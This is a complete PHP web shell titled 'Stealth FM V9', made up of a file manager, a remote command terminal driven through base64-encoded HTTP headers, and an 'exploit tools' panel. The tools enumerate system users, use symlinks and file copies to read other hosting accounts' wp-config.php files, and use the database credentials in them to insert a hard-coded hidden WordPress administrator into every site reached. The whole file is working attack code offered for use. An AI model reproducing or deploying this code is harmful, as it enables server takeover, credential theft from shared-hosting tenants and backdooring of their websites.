<?php
// -------------------------------------------------------------------------
// SERVER SIDE (Stealth API: V9 Speed Edition)
// -------------------------------------------------------------------------
ini_set('display_errors', 0);
ini_set('log_errors', 1);
@set_time_limit(0); 

// Headers
$h_act  = 'HTTP_X_ACTION';
$h_path = 'HTTP_X_PATH';
$h_data = 'HTTP_X_DATA'; 
$h_cmd  = 'HTTP_X_CMD';
$h_tool = 'HTTP_X_TOOL';
$h_step = 'HTTP_X_STEP'; 

$root = realpath(__DIR__); 

// --- HELPER FUNCTIONS ---
function x_read($path) {
    if (is_readable($path)) return @file_get_contents($path);
    if (function_exists('shell_exec')) return @shell_exec("cat '$path'");
    return false;
}
function x_write($path, $data) {
    if (@file_put_contents($path, $data)) return true;
    if (function_exists('fopen')) { $h = @fopen($path, "w"); if ($h) { fwrite($h, $data); fclose($h); return true; } }
    return false;
}
function x_link($target, $link) {
    if (function_exists('symlink')) @symlink($target, $link);
    elseif (function_exists('shell_exec')) @shell_exec("ln -s '$target' '$link'");
}
function get_home_dirs() {
    $d = ['/home']; for ($i = 1; $i <= 9; $i++) $d[] = '/home' . $i; return $d;
}
function force_delete($target) {
    if (is_file($target)) return unlink($target);
    if (is_dir($target)) {
        $files = array_diff(scandir($target), array('.','..'));
        foreach ($files as $file) force_delete("$target/$file");
        $try = rmdir($target); if ($try) return true;
        if (function_exists('shell_exec')) { @shell_exec("rm -rf " . escapeshellarg($target)); return !file_exists($target); }
        return false;
    }
}
function json_out($data) { header('Content-Type: application/json'); echo json_encode($data); exit; }
function human_filesize($bytes, $dec = 2) {
    $size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}

// --- API PROCESSOR ---
if (isset($_SERVER[$h_act])) {
    $action = $_SERVER[$h_act];
    $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
    $req_path = str_replace(['../', '..\\'], '', $raw_path);
    $req_path = ltrim($req_path, '/\\');
    $target = $root . ($req_path ? DIRECTORY_SEPARATOR . $req_path : '');
    
    if(is_dir($target)) @chdir($target); elseif(is_file($target)) @chdir(dirname($target));

    // BASIC ACTIONS
    if ($action === 'list') {
        if (!is_dir($target)) { $target = $root; $req_path = ''; }
        $items = scandir($target); $dirs = []; $files = [];
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $path = $target . DIRECTORY_SEPARATOR . $i; $isDir = is_dir($path);
            $item = ['name'=>$i, 'type'=>$isDir?'dir':'file', 'size'=>$isDir?'-':human_filesize(filesize($path)), 'perm'=>substr(sprintf('%o', fileperms($path)),-4), 'write'=>is_writable($path), 'date'=>date("Y-m-d H:i", filemtime($path))];
            if ($isDir) $dirs[] = $item; else $files[] = $item;
        }
        usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        json_out(['path' => $req_path, 'items' => array_merge($dirs, $files)]);
    }
    if ($action === 'read') { if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit; }
    if ($action === 'save' || $action === 'upload') { $input = file_get_contents("php://input"); echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; exit; }
    if ($action === 'delete') { echo force_delete($target) ? "Deleted" : "Fail delete"; exit; }
    if ($action === 'rename') { $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : ''; if ($n) echo rename($target, dirname($target).DIRECTORY_SEPARATOR.$n) ? "Renamed" : "Fail"; exit; }
    if ($action === 'chmod') { $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : ''; if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit; }
    if ($action === 'cmd') {
        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami'; $cmd .= " 2>&1"; $out = ""; 
        if(function_exists('shell_exec')) { $out = @shell_exec($cmd); }
        elseif(function_exists('passthru')) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
        elseif(function_exists('exec')) { $a=[]; @exec($cmd,$a); $out = implode("\n",$a); }
        elseif(function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); } }
        echo $out ?: "[No Output]"; exit;
    }

    // -- EXPLOIT TOOLS --
    if ($action === 'tool') {
        $tool = isset($_SERVER[$h_tool]) ? $_SERVER[$h_tool] : '';
        $home_dirs = get_home_dirs();
        
        if ($tool === 'bypass_user') {
            $found = ""; $etc = x_read("/etc/passwd");
            if ($etc) {
                $lines = explode("\n", $etc);
                foreach($lines as $l) { $p = explode(":", $l); if(isset($p[0]) && !empty($p[0])) $found .= $p[0] . ":\n"; }
            } else {
                for ($userid = 0; $userid < 2000; $userid++) { $arr = posix_getpwuid($userid); if (!empty($arr) && isset($arr['name'])) $found .= $arr['name'] . ":\n"; }
            }
            if(!empty($found)) { x_write("passwd.txt", $found); echo "Saved to: passwd.txt\nTotal Found: " . count(explode("\n", trim($found))); } 
            else echo "Failed."; exit;
        }

        // ADD ADMIN (BATCH 5 - SPEED MODE)
        if ($tool === 'add_admin') {
            $step = isset($_SERVER[$h_step]) ? (int)$_SERVER[$h_step] : 0;
            $limit = 5; // SPEED: Process 5 files per request

            // Auto-detect jumping folder
            $scan_path = is_dir($target . '/jumping') ? $target . '/jumping' : $target;
            $all_files = scandir($scan_path);
            $config_files = [];
            foreach($all_files as $f) {
                if($f == '.' || $f == '..') continue;
                if(stripos($f, 'config') !== false || stripos($f, 'settings') !== false) $config_files[] = $scan_path . DIRECTORY_SEPARATOR . $f;
            }

            $total = count($config_files);
            
            // Output for end of job
            if ($step >= $total) { echo json_encode(['status'=>'done', 'html'=>'', 'total'=>$total]); exit; }

            // Slice the batch
            $batch_files = array_slice($config_files, $step, $limit);
            $html_log = "";

            foreach($batch_files as $file) {
                $content = x_read($file);
                if(!$content) continue;
                
                if (preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_name)) {
                    $db_name = $m_name[1];
                    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_user); $db_user = $m_user[1] ?? '';
                    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_pass); $db_pass = $m_pass[1] ?? '';
                    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m_host); $db_host = $m_host[1] ?? 'localhost';
                    preg_match("/table_prefix\s*=\s*['\"](.*?)['\"]/", $content, $m_pre); $pre = $m_pre[1] ?? 'wp_';
                    
                    $new_u = "xshikata"; $new_p_raw = "Wh0th3h3llAmi"; $new_p_hash = md5($new_p_raw);
                    
                    // DB Connect (3s Timeout)
                    $link = mysqli_init(); mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
                    $con = @mysqli_real_connect($link, $db_host, $db_user, $db_pass, $db_name);
                    
                    if (!$con && $db_host == 'localhost') {
                        $link = mysqli_init(); mysqli_options($link, MYSQLI_OPT_CONNECT_TIMEOUT, 3);
                        $con = @mysqli_real_connect($link, '127.0.0.1', $db_user, $db_pass, $db_name);
                    }

                    if ($con) {
                        $site_url = "";
                        $q = @mysqli_query($link, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl' LIMIT 1");
                        if ($q && $r = @mysqli_fetch_assoc($q)) $site_url = $r['option_value'];
                        
                        // Fix URL display
                        $disp_url = parse_url($site_url, PHP_URL_HOST);
                        if(!$disp_url) $disp_url = $site_url;

                        $st_txt = "CREATED"; $st_cls = "created"; 
                        $chk = @mysqli_query($link, "SELECT ID FROM {$pre}users WHERE user_login='$new_u'");
                        if ($chk && @mysqli_num_rows($chk) > 0) {
                            $old = @mysqli_fetch_assoc($chk);
                            @mysqli_query($link, "DELETE FROM {$pre}users WHERE ID = " . $old['ID']);
                            @mysqli_query($link, "DELETE FROM {$pre}usermeta WHERE user_id = " . $old['ID']);
                            $st_txt = "REPLACED"; $st_cls = "replaced";
                        }
                        $ins = @mysqli_query($link, "INSERT INTO {$pre}users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('$new_u', '$new_p_hash', '$new_u', 'admin@admin.com', NOW(), 0, '$new_u')");
                        if ($ins) {
                            $uid = @mysqli_insert_id($link);
                            @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
                            @mysqli_query($link, "INSERT INTO {$pre}usermeta (user_id, meta_key, meta_value) VALUES ($uid, '{$pre}user_level', '10')");
                            
                            $html_log .= "<div class='inj-card'><div class='inj-header'><span class='inj-status $st_cls'>$st_txt</span><span class='inj-domain'>$disp_url</span></div><div class='inj-body'><form action='$site_url/wp-login.php' method='post' target='_blank' style='margin:0;'><input type='hidden' name='log' value='$new_u'><input type='hidden' name='pwd' value='$new_p_raw'><button class='inj-btn'><i class='fas fa-sign-in-alt'></i> LOGIN</button></form><div class='inj-creds'>U: $new_u | P: $new_p_raw</div></div></div>";
                        }
                        @mysqli_close($link);
                    }
                }
            }

            // Return Batch Result
            $next_step = $step + $limit;
            if ($next_step < $total) {
                echo json_encode(['status'=>'continue', 'next_step'=>$next_step, 'html'=>$html_log, 'total'=>$total, 'current'=>$next_step]);
            } else {
                echo json_encode(['status'=>'done', 'html'=>$html_log, 'total'=>$total]);
            }
            exit;
        }

        if ($tool === 'symlink_cage') {
            $c = x_read(getcwd()."/passwd.txt"); if(!$c) { echo "Err: passwd.txt missing."; exit; }
            $users = explode("\n", $c); $dir="3x_sym"; @mkdir($dir,0755); chdir($dir);
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType txt .php\nAddHandler txt .php");
            $list = ["wp-config.php","config.php","configuration.php"]; $n=0;
            foreach ($users as $u_str) {
                $u=explode(":",$u_str)[0]; if(!$u) continue;
                foreach ($home_dirs as $h) {
                    foreach ($list as $f) { x_link("$h/$u/public_html/$f", "$u~".str_replace("/","-",$f).".txt"); $n++; }
                }
            }
            echo "Symlink Done. $n links."; exit;
        }

        if ($tool === 'jumper_cage') {
            $c = x_read(getcwd()."/passwd.txt"); if(!$c) { echo "Err: passwd.txt missing."; exit; }
            $users = explode("\n", $c); $dir="jumping"; @mkdir($dir,0755); chdir($dir);
            x_write(".htaccess", "Options Indexes FollowSymLinks\nDirectoryIndex x\nAddType txt .php\nAddHandler txt .php");
            $list = ["wp-config.php","config.php","configuration.php"]; $n=0;
            foreach ($users as $u_str) {
                $u=explode(":",$u_str)[0]; if(!$u) continue;
                foreach ($home_dirs as $h) {
                    foreach ($list as $f) {
                        $dat=x_read("$h/$u/public_html/$f");
                        if($dat) { x_write("$u~".str_replace("/","",$h)."~".str_replace("/","-",$f).".txt", $dat); $n++; }
                    }
                }
            }
            echo "Jumper Done. $n copied."; exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Stealth FM V9</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg-dark: #121212; --bg-card: #1e1e1e; --border: #333; }
        body { background-color: var(--bg-dark); font-family: 'Segoe UI', Tahoma, sans-serif; font-size: 0.9rem; padding-bottom: 50px; }
        .navbar { background-color: var(--bg-card); border-bottom: 1px solid var(--border); height: 60px; }
        .path-display { font-family: monospace; color: #ccc; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }
        .badge-perm { font-family: monospace; cursor: pointer; font-size: 0.8rem; }
        .icon-dir { color: #f1c40f; } .icon-file { color: #3498db; }
        .btn-icon { width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center; border-radius: 6px; border: none; transition: 0.2s; }
        .btn-edit { background: rgba(52, 152, 219, 0.15); color: #3498db; }
        .btn-del { background: rgba(231, 76, 60, 0.15); color: #e74c3c; }
        #editor-area { font-family: 'Consolas', 'Monaco', monospace; font-size: 14px; background: #151515; color: #eee; border: 1px solid #333; outline: none; resize: none; }
        #term-output { font-family: 'Consolas', monospace; font-size: 13px; white-space: pre-wrap; color: #0f0; min-height: 300px; padding-bottom: 10px; }
        .term-input-line { display: flex; align-items: center; border-top: 1px solid #333; padding-top: 10px; }
        #term-cmd { background: transparent; border: none; color: #fff; width: 100%; outline: none; font-family: 'Consolas', monospace; margin-left: 10px; }
        .prompt-char { color: #00bfff; font-weight: bold; }
        /* Tools */
        .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
        .tool-card { background: #252526; border: 1px solid #333; padding: 15px; text-align: center; cursor: pointer; border-radius: 5px; transition: 0.2s; }
        .tool-card:hover { background: #333; border-color: #555; }
        .tool-card i { font-size: 24px; margin-bottom: 8px; color: #aaa; }
        .tool-card:hover i { color: #fff; }
        .tool-card span { display: block; font-size: 11px; font-weight: bold; color: #ccc; }
        #tool-log { font-family: 'Consolas', monospace; font-size: 12px; color: #ddd; background: #000; padding: 10px; margin-top: 15px; border: 1px solid #333; height: 250px; overflow-y: auto; display: none; }
        /* Inject Card */
        .inj-card { background: #0a0a0a; border: 1px solid #333; border-left: 3px solid #333; padding: 8px; margin-bottom: 8px; border-radius: 4px; font-family: 'Segoe UI', sans-serif; transition: all 0.2s; }
        .inj-card:hover { border-color: #444; background: #111; transform: translateX(2px); }
        .inj-header { display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 5px; align-items: center; }
        .inj-status { font-weight: bold; padding: 2px 6px; border-radius: 3px; font-size: 9px; letter-spacing: 0.5px; text-transform: uppercase; }
        .inj-status.created { background: rgba(46, 204, 113, 0.15); color: #2ecc71; border: 1px solid rgba(46, 204, 113, 0.3); }
        .inj-status.replaced { background: rgba(243, 156, 18, 0.15); color: #f39c12; border: 1px solid rgba(243, 156, 18, 0.3); }
        .inj-domain { color: #fff; font-weight: bold; font-size: 11px; }
        .inj-body { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-top: 5px; }
        .inj-btn { background: #27ae60; color: #fff; border: none; padding: 4px 10px; border-radius: 3px; font-size: 10px; cursor: pointer; text-decoration: none; display: inline-flex; align-items: center; gap: 5px; font-weight: bold; }
        .inj-btn:hover { background: #2ecc71; color: #000; }
        .inj-creds { font-size: 10px; color: #aaa; border: 1px solid #333; padding: 3px 8px; border-radius: 3px; background: #151515; }
        @media (min-width: 768px) { .modal-xl { max-width: 90%; } .modal-body.editor-body { height: 75vh; } .modal-body.term-body { height: 70vh; overflow-y: auto; background: #0c0c0c; } #editor-area { height: 100% !important; } .desktop-toolbar { display: flex; align-items: center; justify-content: space-between; } .upload-group { width: auto; max-width: 350px; } }
        @media (max-width: 767px) { .d-mobile-none { display: none !important; } .mobile-name { display: block; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; } .modal-dialog { margin: 0; max-width: 100%; height: 100%; } .modal-content { height: 100%; border-radius: 0; } .modal-body { flex-grow: 1; padding: 0; } .modal-body.term-body { background: #0c0c0c; padding: 10px; height: calc(100vh - 60px); overflow-y: auto; } #editor-area { border: none; height: 100% !important; } .desktop-toolbar { display: block; } .upload-group { width: 100%; margin-top: 10px; } }
    </style>
</head>
<body>

<nav class="navbar fixed-top shadow-sm">
    <div class="container-fluid flex-nowrap gap-3">
        <a class="navbar-brand text-light d-flex align-items-center me-0" href="#"><i class="fas fa-ghost me-2"></i><span class="fw-bold d-none d-md-inline">Stealth<span class="text-primary">FM</span></span></a>
        <div class="d-flex gap-2">
            <button class="btn btn-outline-secondary btn-sm" onclick="loadDir('')"><i class="fas fa-home"></i></button>
            <button class="btn btn-outline-secondary btn-sm" onclick="loadDir('..')"><i class="fas fa-level-up-alt"></i></button>
            <button class="btn btn-outline-success btn-sm" onclick="openTerm()"><i class="fas fa-terminal"></i></button>
            <button class="btn btn-outline-warning btn-sm" onclick="openTools()"><i class="fas fa-hammer"></i></button>
        </div>
        <div class="d-flex align-items-center flex-grow-1 bg-dark rounded border border-secondary px-3 py-1" style="height: 34px; min-width: 0;"><i class="fas fa-folder-open me-2 text-warning small"></i><div id="path-txt" class="path-display">/</div></div>
    </div>
</nav>

<div class="container-fluid" style="margin-top: 80px;">
    <div class="card bg-card border-secondary shadow">
        <div class="card-header bg-transparent border-secondary py-3 desktop-toolbar">
            <div class="text-light fw-bold mb-2 mb-md-0 d-flex align-items-center"><i class="fas fa-list me-2 text-primary"></i> Files</div>
            <div class="input-group input-group-sm upload-group">
                <input type="file" id="uploadInput" class="form-control bg-secondary text-light border-secondary">
                <button class="btn btn-primary" onclick="uploadFile()" id="btnUpload"><i class="fas fa-cloud-upload-alt"></i> Upload</button>
            </div>
        </div>
        <div class="table-responsive">
            <table class="table table-hover align-middle mb-0 text-light"><thead class="table-dark"><tr><th class="ps-3">Name</th><th class="d-mobile-none">Size</th><th class="text-center">Perms</th><th class="d-mobile-none">Date</th><th class="text-end pe-3">Action</th></tr></thead><tbody id="fileList"></tbody></table>
        </div>
    </div>
</div>

<div class="modal fade" id="editModal" tabindex="-1" data-bs-backdrop="static"><div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable"><div class="modal-content bg-card border-secondary text-light"><div class="modal-header border-secondary py-2"><h6 class="modal-title" id="editFileName"><i class="fas fa-edit me-2"></i>Edit</h6><div class="d-flex gap-2 ms-auto"><button type="button" class="btn btn-sm btn-secondary" data-bs-dismiss="modal">Close</button><button type="button" class="btn btn-sm btn-primary" onclick="saveFile()" id="btnSave">Save</button></div></div><div class="modal-body editor-body p-0"><textarea id="editor-area" class="form-control rounded-0" spellcheck="false"></textarea></div></div></div></div>
<div class="modal fade" id="termModal" tabindex="-1"><div class="modal-dialog modal-xl modal-dialog-centered"><div class="modal-content bg-card border-secondary text-light"><div class="modal-header border-secondary py-2 bg-dark"><h6 class="modal-title text-success"><i class="fas fa-terminal me-2"></i>Terminal</h6><button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button></div><div class="modal-body term-body"><div id="term-output"><div style="color:#888;"># Stealth Shell Ready.</div></div><div class="term-input-line"><span class="prompt-char">➜</span><input type="text" id="term-cmd" placeholder="Type command..." autocomplete="off"></div></div></div></div></div>

<div class="modal fade" id="toolsModal" tabindex="-1">
    <div class="modal-dialog modal-lg modal-dialog-centered">
        <div class="modal-content bg-card border-secondary text-light">
            <div class="modal-header border-secondary py-2 bg-dark">
                <h6 class="modal-title text-warning"><i class="fas fa-hammer me-2"></i> <span id="tool-title">Stealth Exploits</span></h6>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body p-3">
                <div class="alert alert-dark border-secondary p-2 mb-3 small"><i class="fas fa-info-circle text-info"></i> Tool Running in: <b><span id="tool-path-disp">/</span></b></div>
                <div class="tools-grid">
                    <div class="tool-card" onclick="runTool('bypass_user')"><i class="fas fa-users-slash"></i><span>User Enum</span></div>
                    <div class="tool-card" onclick="runWatchdogTool('add_admin', 0)"><i class="fas fa-user-plus text-success"></i><span class="text-success">Add Admin (Auto)</span></div>
                    <div class="tool-card" onclick="runTool('symlink_cage')"><i class="fas fa-project-diagram"></i><span>Symlinker (CageFS)</span></div>
                    <div class="tool-card" onclick="runTool('jumper_cage')"><i class="fas fa-box-open"></i><span>Jumper (CageFS)</span></div>
                </div>
                <div id="tool-log"></div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let currentPath = '', currentFile = '';
    const editModal = new bootstrap.Modal(document.getElementById('editModal'));
    const termModal = new bootstrap.Modal(document.getElementById('termModal'));
    const toolsModal = new bootstrap.Modal(document.getElementById('toolsModal'));

    async function api(action, path, method = 'GET', extraHeaders = {}, body = null, signal = null) {
        let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
        let opts = { method, headers, body };
        if(signal) opts.signal = signal;
        return fetch(window.location.href, opts);
    }

    function loadDir(path) {
        let target = currentPath;
        if (path === '..') target = target.includes('/') ? target.substring(0, target.lastIndexOf('/')) : '';
        else if (path !== '') target = target ? target + '/' + path : path;
        else target = '';
        api('list', target).then(r => r.json()).then(res => {
            currentPath = res.path; document.getElementById('path-txt').innerText = res.path || '/'; document.getElementById('tool-path-disp').innerText = res.path || '/';
            const tbody = document.getElementById('fileList'); tbody.innerHTML = '';
            if (!res.items.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center py-4 text-muted">Empty Directory</td></tr>'; return; }
            res.items.forEach(f => {
                let isDir = f.type === 'dir'; let icon = isDir ? '<i class="fas fa-folder icon-dir me-2"></i>' : '<i class="fas fa-file-code icon-file me-2"></i>';
                let click = isDir ? `loadDir('${f.name}')` : `openEditor('${f.name}')`; let pColor = f.write ? 'bg-success' : 'bg-danger';
                tbody.innerHTML += `<tr><td class="ps-3"><a onclick="${click}" class="text-decoration-none text-light cursor-pointer mobile-name fw-bold">${icon}${f.name}</a></td><td class="d-mobile-none text-muted"><small>${f.size}</small></td><td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge ${pColor} badge-perm">${f.perm}</span></td><td class="d-mobile-none text-muted"><small>${f.date}</small></td><td class="text-end pe-3"><button class="btn-icon btn-edit me-1" onclick="renameItem('${f.name}')"><i class="fas fa-pen"></i></button><button class="btn-icon btn-del" onclick="deleteItem('${f.name}')"><i class="fas fa-trash"></i></button></td></tr>`;
            });
        }).catch(() => alert('Network Error'));
    }

    function openEditor(name) { currentFile = currentPath ? currentPath + '/' + name : name; api('read', currentFile).then(r => r.text()).then(txt => { document.getElementById('editFileName').innerHTML = `<i class="fas fa-file-code me-2"></i> ${name}`; document.getElementById('editor-area').value = txt; editModal.show(); }); }
    function saveFile() { let btn=document.getElementById('btnSave'); let old=btn.innerHTML; btn.innerHTML='Saving...'; api('save', currentFile, 'PUT', {}, document.getElementById('editor-area').value).then(r => r.text()).then(m => { alert(m); editModal.hide(); btn.innerHTML=old; }); }
    function uploadFile() { let input=document.getElementById('uploadInput'); if(!input.files.length) return; let btn=document.getElementById('btnUpload'); let old=btn.innerHTML; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>'; let path=currentPath ? currentPath + '/' + input.files[0].name : input.files[0].name; api('upload', path, 'PUT', {}, input.files[0]).then(r => r.text()).then(m => { alert(m); input.value=''; btn.innerHTML=old; loadDir(''); }); }
    function deleteItem(name) { if(confirm(`Del ${name}?`)) api('delete', currentPath ? currentPath + '/' + name : name, 'DELETE').then(r => r.text()).then(res => { alert(res); loadDir(''); }); }
    function renameItem(name) { let n=prompt("New name:", name); if(n && n !== name) api('rename', currentPath ? currentPath + '/' + name : name, 'GET', {'X-Data': btoa(n)}).then(r => { alert(r.text()); loadDir(''); }); }
    function chmodItem(name, p) { let n=prompt("Chmod:", "0"+p); if(n) api('chmod', currentPath ? currentPath + '/' + name : name, 'GET', {'X-Data': n}).then(() => loadDir('')); }
    
    function openTerm() { termModal.show(); setTimeout(() => document.getElementById('term-cmd').focus(), 500); }
    document.getElementById('term-cmd').addEventListener('keypress', function (e) { if (e.key === 'Enter') { let cmd=this.value; if(!cmd) return; let outDiv=document.getElementById('term-output'); outDiv.innerHTML += `<div><span style="color:#00bfff;">➜</span> <span style="color:#fff;">${cmd}</span></div>`; this.value = ''; let modalBody=document.querySelector('.term-body'); modalBody.scrollTop=modalBody.scrollHeight; api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => { outDiv.innerHTML += `<div style="color:#ccc; margin-bottom:10px;">${res}</div>`; modalBody.scrollTop=modalBody.scrollHeight; }); } });

    function openTools() { toolsModal.show(); document.getElementById('tool-log').style.display='none'; document.getElementById('tool-log').innerHTML=''; document.getElementById('tool-title').innerText = "Stealth Exploits"; }
    function runTool(toolName) {
        let log = document.getElementById('tool-log'); log.style.display='block'; log.innerHTML += `<div>[+] Running ${toolName}...</div>`;
        api('tool', currentPath, 'GET', {'X-Tool': toolName}).then(r => r.text()).then(res => { log.innerHTML += res; log.innerHTML += `<div>[=] Done.</div><br>`; log.scrollTop = log.scrollHeight; }).catch(e => { log.innerHTML += `<div style="color:red">Error: ${e}</div>`; });
    }

    // --- CLIENT-SIDE WATCHDOG (ANTI-STUCK + SPEED) ---
    function runWatchdogTool(toolName, step) {
        let log = document.getElementById('tool-log'); 
        let title = document.getElementById('tool-title');
        
        if(step === 0) {
            log.style.display='block'; 
            log.innerHTML = `<div>[+] Starting ${toolName} with Watchdog...</div><hr>`;
        }

        // Setup Controller Abort (Timeout 20 seconds for 5 files)
        const controller = new AbortController();
        const timeoutId = setTimeout(() => {
            controller.abort();
            log.innerHTML += `<div style="color:orange">[!] Watchdog: Batch Timeout (20s) at #${step}. Skipping 5 files...</div>`;
            log.scrollTop = log.scrollHeight;
            runWatchdogTool(toolName, step + 5); // FORCE NEXT BATCH
        }, 20000); 

        api('tool', currentPath, 'GET', {'X-Tool': toolName, 'X-Step': step}, null, controller.signal)
        .then(r => r.json())
        .then(res => {
            clearTimeout(timeoutId); // Success, kill watchdog timer
            
            if(res.html) log.innerHTML += res.html;
            
            if(res.status === 'continue') {
                title.innerText = `Scan: ${res.current} / ${res.total}`;
                log.scrollTop = log.scrollHeight;
                // Faster next tick
                setTimeout(() => runWatchdogTool(toolName, res.next_step), 10); 
            } else {
                title.innerText = "Done";
                log.innerHTML += `<hr><div style="color:#2ecc71; font-weight:bold;">[=] JOB FINISHED. Scanned ${res.total} files.</div><br>`;
                log.scrollTop = log.scrollHeight;
            }
        })
        .catch(err => {
            // If AbortError, Watchdog already handled skip.
            if (err.name === 'AbortError') return;
            
            // If Network Error, Log and Force Skip Batch
            log.innerHTML += `<div style="color:red">[!] Net Err at #${step}. Skipping batch...</div>`;
            runWatchdogTool(toolName, step + 5); 
        });
    }

    loadDir('');
</script>
</body>
</html>
